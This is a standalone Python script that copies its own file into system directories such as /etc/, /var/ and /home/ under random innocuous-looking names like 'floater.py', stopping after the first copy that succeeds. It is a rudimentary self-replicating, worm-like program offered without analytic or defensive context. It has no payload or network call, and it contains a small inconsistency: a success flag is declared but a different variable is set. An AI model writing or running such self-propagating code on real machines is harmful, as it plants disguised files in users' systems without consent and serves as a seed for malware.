#!/bin/python3

import shutil
import os
import random

def replicate(target_dirs, dest_names):
	current_path = os.path.abspath(__file__)
	suc_flag = False
	for dirs in target_dirs:
		rando_file = random.choice(dest_names)
		destination = os.path.join(dirs, rando_file)
		try:
			shutil.copyfile(current_path, destination)
			replication_successful = True
			print("worked")
			break
		except FileNotFoundError:
			print(f"Failed: File not found at {destination}")
		except PermissionError:
			print(f"Failed: Permission denied for {destination}")
		except Exception as e:
			print(f"Failed: An unexpected error occured: {e}")

if __name__ == "__main__":
	target_dirs= ["/etc/", "/var/", "/home/", "/var/tmp/", "/tmp/" ]
	dest_names= ["sink.py", "floater.py", "swaggy.py"]
	replicate(target_dirs, dest_names)
